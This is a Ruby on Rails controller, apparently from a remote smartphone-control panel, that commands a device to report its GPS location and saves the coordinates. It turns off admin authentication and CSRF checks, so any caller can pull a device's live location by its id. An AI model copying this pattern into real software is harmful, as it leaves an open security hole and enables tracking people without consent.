class GeoLocationsController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token
  include CommandSender
  
  def dump_location
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      
      # Send command via ActionCable and wait for response
      pending_command = send_command_and_wait(@smartphone, 'get_location', {}, timeout: 30.seconds)
      
      if pending_command.completed?
        raw = pending_command.response_data
        # Extract location from nested payload if present
        location_data = raw['payload'] || raw
        
        latitude = location_data['latitude']
        longitude = location_data['longitude']
        accuracy = location_data['accuracy']
        
        if latitude.present? && longitude.present?
          # Save to database
          GeoLocation.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            lat: latitude.to_s,
            long: longitude.to_s,
            smartphone_id: @smartphone.id
          )
        end
        
        commandOutput = ["Location: Lat: #{latitude}, Lon: #{longitude}, Accuracy: #{accuracy}m"]
      else
        error_msg = pending_command.response_data&.dig('error') || 'Device did not respond'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error dumping location: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { 
        output: commandOutput,
        data: (defined?(location_data) ? location_data : nil)
      }
    else
      respond_to do |format|
        format.js {
          render "dump_location", locals: { 
            commandOutput: commandOutput, 
            fileName: @fileName,
            location_data: (defined?(location_data) ? location_data : nil)
          }
        }
      end
    end
  end

  private

  def want_json?
    request.format.json? || request.headers['Accept']&.include?('application/json')
  end

  def geo_location_params
    params.require(:geo_location).permit(:date,
                                         :lat,
                                         :long,
                                         :smartphone_id)
  end
end
